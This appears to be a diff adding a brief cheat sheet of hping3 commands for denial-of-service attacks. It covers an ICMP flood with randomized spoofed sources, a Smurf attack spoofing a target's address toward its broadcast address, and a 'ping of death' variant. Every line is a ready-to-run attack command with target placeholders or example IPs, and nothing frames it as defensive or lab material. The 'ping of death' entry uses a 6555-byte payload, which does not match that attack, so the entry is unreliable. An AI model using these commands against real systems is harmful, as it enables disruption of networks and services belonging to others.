@@ -1,0 +1,14 @@
+HPING3 to FLOOD target:
+
+sudo hping3 --icmp <target's ip> --rand-source --flood
+
+SMURF ATTACK :
+
+sudo hping3 --icmp --flood -a <target-ip> <broadcast_address of target>
+example:  sudo hping3 --icmp --flood -a 192.168.74.235 192.168.74.255
+
+
+PING of DEATH:
+
+sudo hping3 --icmp --data 6555 --flood <target ip>
+sudo hping3 --icmp --data <packet payload size> --flood 192.168.74.235
